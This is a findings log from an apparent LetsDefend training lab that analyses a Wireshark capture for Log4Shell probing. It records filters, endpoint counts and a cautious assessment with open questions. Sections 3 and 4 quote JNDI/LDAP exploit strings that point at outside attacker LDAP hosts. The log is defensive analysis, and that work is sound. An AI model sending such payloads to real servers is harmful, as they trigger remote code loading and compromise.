# Findings Log — Wireshark Traffic Analysis

Dataset: `Challenge.pcap` (LetsDefend training lab)  
Total packets shown by Wireshark: 80,843  
Capture dates visible: 17–18 December 2021

## 1. Filters and packet counts

| Display filter | Displayed packets | Result |
|---|---:|---|
| `tcp.dstport == 80` | 9,410 (11.6%) | TCP packets with destination port 80 |
| `ip.addr == 91.189.89.199 and ip.addr == 198.71.247.91` | 424 (0.5%) | NTPv4 traffic between the two IPv4 addresses |
| `frame contains "jndi"` | 25 | Frames containing the string `jndi` |
| `frame contains "jndi" and frame contains "31.131.16.127"` | 8 | HTTP packets containing both strings |

## 2. Endpoint statistics for the specific JNDI filter

The Endpoints window had **Limit to display filter** enabled. These values therefore describe the eight filtered packets, not the full capture.

| IPv4 address | Packets | Bytes | Tx packets | Tx bytes | Rx packets | Rx bytes |
|---|---:|---:|---:|---:|---:|---:|
| `46.105.95.220` | 4 | 983 | 4 | 983 | 0 | 0 |
| `104.248.144.120` | 4 | 983 | 4 | 983 | 0 | 0 |
| `198.71.247.91` | 8 | 1,966 | 0 | 0 | 8 | 1,966 |

## 3. Specific JNDI/LDAP payload

Visible request pattern:

```text
GET /\${jndi:ldap://31.131.16.127:1389/Exploit} HTTP/1.1
Host: 198.71.247.91
```

| Source IP | Destination IP | Visible packets | Assessment |
|---|---|---:|---|
| `46.105.95.220` | `198.71.247.91` | 4 | JNDI/LDAP-style probe |
| `104.248.144.120` | `198.71.247.91` | 4 | JNDI/LDAP-style probe |

Important distinction: `31.131.16.127:1389` is embedded in the JNDI payload. The visible HTTP packets are addressed to `198.71.247.91`; no separate connection to the embedded LDAP endpoint is demonstrated by this screenshot.

## 4. Other JNDI match

The broad filter `frame contains "jndi"` shows 25 frames. A visible request from `195.54.160.149` to `198.71.247.91` contains a string beginning:

```text
${jndi:ldap://195.54.160.149:12344/...
```

Four visible `GET /` frames from `49.7.224.217` also match the broad frame filter, but the Info column alone does not show the JNDI payload. Inspect packet details before classifying this IP as an exploit source.

## 5. IP-pair conversation

Filter: `ip.addr == 91.189.89.199 and ip.addr == 198.71.247.91`

- Displayed packets: 424 (0.5%).
- Protocol shown: NTP Version 4.
- Endpoints: `198.71.247.91` and `91.189.89.199`.
- Packet list shows NTP client and server messages.

The screenshot does not establish a relationship between this NTP conversation and the JNDI/HTTP activity.

## 6. Assessment

Suspicious JNDI/LDAP-style requests consistent with Log4Shell probing (CVE-2021-44228) are present. The screenshots do not prove that the target was vulnerable or that code execution succeeded. Correlate with server/application logs and endpoint telemetry before declaring compromise.

## 7. Open questions

- Does the target application use an affected Log4j version/configuration?
- Do server logs show the JNDI strings at the corresponding timestamps?
- Is there evidence of outbound LDAP from the target?
- What is contained in the full packet details for the `49.7.224.217` matches?
- Does endpoint telemetry show any post-exploitation activity?

## References

- [CVE.org — CVE-2021-44228](https://www.cve.org/CVERecord?id=CVE-2021-44228)
- [Apache Logging Services — Security](https://logging.apache.org/security.html)
